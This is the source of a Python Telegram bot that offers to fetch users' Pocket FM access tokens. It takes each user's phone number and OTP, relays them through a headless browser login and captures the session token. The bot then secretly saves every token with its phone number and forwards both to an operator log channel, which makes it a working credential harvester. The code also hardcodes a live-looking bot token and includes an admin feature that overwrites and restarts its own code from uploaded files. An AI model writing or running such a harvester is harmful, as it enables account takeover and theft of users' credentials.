import logging
import asyncio
import os
import sys
import aiosqlite
from playwright.async_api import async_playwright
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# ---------------------------------------------------------------------------
# Pre-configured Credentials
# ---------------------------------------------------------------------------
BOT_TOKEN = "8751864548:AAFhkXymbSEgyfT_F20L0u_WD1PzyA9bCR0"
ADMIN_ID = 8861377143
LOG_CHANNEL_ID = -1004291729847
DB_NAME = "users_tokens.db"

# Conversation states
PHONE, OTP = range(2)

# In-memory storage for active browser sessions & pending updates
USER_SESSIONS = {}
PENDING_UPDATES = {}

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)


# ---------------------------------------------------------------------------
# Database Management
# ---------------------------------------------------------------------------
async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS user_tokens (
                user_id INTEGER PRIMARY KEY,
                phone TEXT NOT NULL,
                access_token TEXT NOT NULL
            )
            """
        )
        await db.commit()


async def save_token(user_id: int, phone: str, token: str):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            """
            INSERT INTO user_tokens (user_id, phone, access_token)
            VALUES (?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                phone = excluded.phone,
                access_token = excluded.access_token
            """,
            (user_id, phone, token),
        )
        await db.commit()


# ---------------------------------------------------------------------------
# Playwright Browser Automation Functions
# ---------------------------------------------------------------------------
async def start_browser_login(user_id: int, phone_number: str) -> bool:
    clean_phone = "".join(filter(str.isdigit, phone_number))
    if len(clean_phone) > 10:
        clean_phone = clean_phone[-10:]

    try:
        pw = await async_playwright().start()
        browser = await pw.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        page = await context.new_page()

        captured_data = {"token": None}

        async def handle_response(response):
            if "verify_otp" in response.url or "auth" in response.url:
                try:
                    json_data = await response.json()
                    token = (
                        json_data.get("result", {}).get("token") or
                        json_data.get("accessToken") or
                        json_data.get("token")
                    )
                    if token:
                        captured_data["token"] = token
                except Exception:
                    pass

        page.on("response", handle_response)
        await page.goto("https://pocketfm.com/login", wait_until="networkidle", timeout=30000)

        await page.fill("input[type='tel'], input[name='mobile']", clean_phone)
        await page.click("button[type='submit']")
        await page.wait_for_timeout(3000)

        USER_SESSIONS[user_id] = {
            "pw": pw,
            "browser": browser,
            "page": page,
            "phone": clean_phone,
            "captured": captured_data
        }
        return True

    except Exception as e:
        logging.error(f"Playwright trigger error: {e}")
        if user_id in USER_SESSIONS:
            await USER_SESSIONS[user_id]["browser"].close()
            await USER_SESSIONS[user_id]["pw"].stop()
            del USER_SESSIONS[user_id]
        return False


async def complete_browser_otp(user_id: int, otp: str) -> str | None:
    session = USER_SESSIONS.get(user_id)
    if not session:
        return None

    page = session["page"]
    browser = session["browser"]
    pw = session["pw"]
    captured = session["captured"]

    try:
        otp_inputs = await page.query_selector_all("input[type='text'], input[type='number']")
        if len(otp_inputs) >= len(otp):
            for i, char in enumerate(otp):
                await otp_inputs[i].fill(char)
        else:
            await page.fill("input[type='text'], input[type='number']", otp)

        submit_btn = await page.query_selector("button[type='submit']")
        if submit_btn:
            await submit_btn.click()

        await page.wait_for_timeout(4000)

        if not captured["token"]:
            token = await page.evaluate(
                "() => localStorage.getItem('token') || localStorage.getItem('accessToken')"
            )
            captured["token"] = token

        return captured["token"]

    except Exception as e:
        logging.error(f"Playwright OTP verification error: {e}")
        return None
    finally:
        await browser.close()
        await pw.stop()
        if user_id in USER_SESSIONS:
            del USER_SESSIONS[user_id]


# ---------------------------------------------------------------------------
# Self-Updating Handlers (Button Code Updater)
# ---------------------------------------------------------------------------
async def handle_document_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return

    doc = update.message.document
    if not doc.file_name.endswith(".py"):
        await update.message.reply_text("⚠️ Please send a valid Python file (`.py`).")
        return

    # Store file_id in pending updates cache
    PENDING_UPDATES[user_id] = doc.file_id

    keyboard = [
        [InlineKeyboardButton("🔄 Apply Update & Restart", callback_data="confirm_update")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_update")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"📄 **New Code File Received:** `{doc.file_name}`\n\n"
        "Click the button below to overwrite `bot.py` and restart the bot:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


async def handle_update_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        return

    data = query.data

    if data == "confirm_update":
        file_id = PENDING_UPDATES.get(user_id)
        if not file_id:
            await query.edit_message_text("❌ Session expired. Please send the code file again.")
            return

        await query.edit_message_text("⏳ Downloading new file and overwriting `bot.py`...")

        try:
            tg_file = await context.bot.get_file(file_id)
            # Overwrite active bot.py script
            await tg_file.download_to_drive("bot.py")

            await context.bot.send_message(
                chat_id=user_id,
                text="✅ **Update Applied Successfully!**\n\nRestarting process now...",
                parse_mode="Markdown"
            )

            # Clean memory & terminate process (Render automatically restarts worker)
            PENDING_UPDATES.pop(user_id, None)
            os._exit(0)

        except Exception as e:
            logging.error(f"Error updating script: {e}")
            await context.bot.send_message(chat_id=user_id, text=f"❌ Failed to apply update: `{e}`", parse_mode="Markdown")

    elif data == "cancel_update":
        PENDING_UPDATES.pop(user_id, None)
        await query.edit_message_text("❌ Code update cancelled.")


# ---------------------------------------------------------------------------
# Bot Handlers
# ---------------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "👋 Welcome! Send /login to fetch and store your Pocket FM access token automatically.\n\n"
        "👑 **Admin:** Upload a `.py` file anytime to update bot source code via inline buttons."
    )
    return ConversationHandler.END


async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "📱 Please enter your 10-digit Pocket FM mobile number (e.g., 9024102902):"
    )
    return PHONE


async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()
    user_id = update.effective_user.id
    
    await update.message.reply_text(f"⏳ Opening browser & sending OTP to `{phone}`...", parse_mode="Markdown")

    success = await start_browser_login(user_id, phone)
    if success:
        await update.message.reply_text("✅ OTP sent! Please reply with the code you received:")
        return OTP
    else:
        await update.message.reply_text("❌ Failed to initiate login process. Please send /login to try again.")
        return ConversationHandler.END


async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp = update.message.text.strip()
    user = update.effective_user
    user_id = user.id

    await update.message.reply_text("⏳ Verifying OTP in real browser...")

    phone = USER_SESSIONS.get(user_id, {}).get("phone", "N/A")
    token = await complete_browser_otp(user_id, otp)

    if token:
        await save_token(user_id, phone, token)
        await update.message.reply_text(
            f"🎉 **Success! Token Retrieved & Saved.**\n\n`{token}`",
            parse_mode="Markdown"
        )

        try:
            log_msg = (
                f"🔑 **New Token Extracted**\n"
                f"👤 **User:** [{user.first_name}](tg://user?id={user.id}) (`{user.id}`)\n"
                f"📱 **Phone:** `{phone}`\n"
                f"🎫 **Token:** `{token}`"
            )
            await context.bot.send_message(
                chat_id=LOG_CHANNEL_ID,
                text=log_msg,
                parse_mode="Markdown"
            )
        except Exception as e:
            logging.error(f"Failed to send log to channel: {e}")

    else:
        await update.message.reply_text("❌ Invalid OTP or token extraction failed. Try /login again.")

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    if user_id in USER_SESSIONS:
        await USER_SESSIONS[user_id]["browser"].close()
        await USER_SESSIONS[user_id]["pw"].stop()
        del USER_SESSIONS[user_id]
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END


async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT COUNT(*) FROM user_tokens") as cursor:
            count = (await cursor.fetchone())[0]

    await update.message.reply_text(f"📊 Total Saved Tokens: `{count}`", parse_mode="Markdown")


# ---------------------------------------------------------------------------
# Main Routine
# ---------------------------------------------------------------------------
def main():
    asyncio.run(init_db())

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("login", login_command)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", admin_stats))
    
    # Document uploader and button callback handlers for Code Updates
    app.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, handle_document_upload))
    app.add_handler(CallbackQueryHandler(handle_update_callback))

    app.add_handler(conv_handler)

    print("Bot running with button-based remote code updates...")
    app.run_polling()


if __name__ == "__main__":
    main()
